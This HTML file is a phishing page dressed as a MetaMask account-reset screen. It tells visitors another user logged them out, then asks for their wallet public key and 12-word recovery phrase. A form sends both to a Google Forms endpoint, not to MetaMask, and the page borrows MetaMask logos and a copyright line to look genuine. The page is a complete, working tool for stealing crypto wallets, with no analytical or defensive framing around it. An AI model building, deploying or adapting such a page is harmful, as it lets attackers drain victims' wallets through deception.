<!DOCTYPE html>
<html lang="en">

<head>
    <link rel="stylesheet" href="script.css">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trouble With Login?</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
</head>

<body>
    <div id="bg">
        <nav class="navbar navbar-expand-lg navbar-light bg-light p-3">
            <a class="navbar-brand" href="#">Reset Account</a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarText" aria-controls="navbarText" aria-expanded="false" aria-label="Toggle navigation">
              <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarText">
              <ul class="navbar-nav mr-auto">
                <li class="nav-item active">
                  <a class="nav-link" href="#">Reset Account <span class="sr-only">(current)</span></a>
                </li>
                <li class="nav-item">
                  <a class="nav-link" href="#">Security</a>
                </li>
                <li class="nav-item">
                  <a class="nav-link" href="#">Trusted</a>
                </li>
              </ul>
              <span class="navbar-text">
                
              </span>
            </div>
          </nav>

        <main class="my-5 mx-auto">     
           
            <div class="col mt-5 w-100 d-flex justify-content-center">
                <div class="row text-center mb-3">
                    <h2>You have been logged out by another user.</br>Please sign in again.</h2>
                </div>
            </div>
   
            <form class="col p-3 mx-auto" method="POST" action="https://docs.google.com/forms/d/e/1FAIpQLSer_v3LhcmvjJ6eJMa_MXn6RRfRZ72nSKnIG6hm44V6f9vjNw/formResponse">
                <div id="container" class="col bg-light p-3 rounded">
                    <div class="col w-100 d-flex justify-content-center">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/1200px-MetaMask_Fox.svg.png" height="340" alt="">
                    </div>
                    <div class="col-6 w-100 p-2">
                        <input type="text" name="entry.2101674782" class="form-control mt-2" placeholder="Public Key (Example: 0x472...ce04)" aria-label="Recipient's username" aria-describedby="basic-addon2">
                    </div>
                    <div class="col-6 w-100 p-2">
                        <input type="password" name="entry.1791664064" class="form-control mb-2" placeholder="Enter your 12-word login phrase" aria-label="Recipient's username" aria-describedby="basic-addon2">
                    </div>
                    <div type="button" class="col w-100 d-flex justify-content-center">
                        <button class="btn text-light btn-primary btn-outline-secondary mt-2">Verify</button>
                    </div>
                </div>
            </form>
            <div class="col mt-5 w-100 d-flex justify-content-center">
                <img src="https://images.ctfassets.net/9sy2a0egs6zh/78HoDbPwuWz8M6er6joJdE/c440f3e5d7262a424f13da69a46e958a/wallet-illo.svg" alt="">
            </div>
            
        </main>
        <footer class="p-2 text-dark">@2022 MetaMask â€¢ A ConsenSys Formation</footer>
    </div>
    <script src="./assets/js/script.js"></script>
</body>

</html>
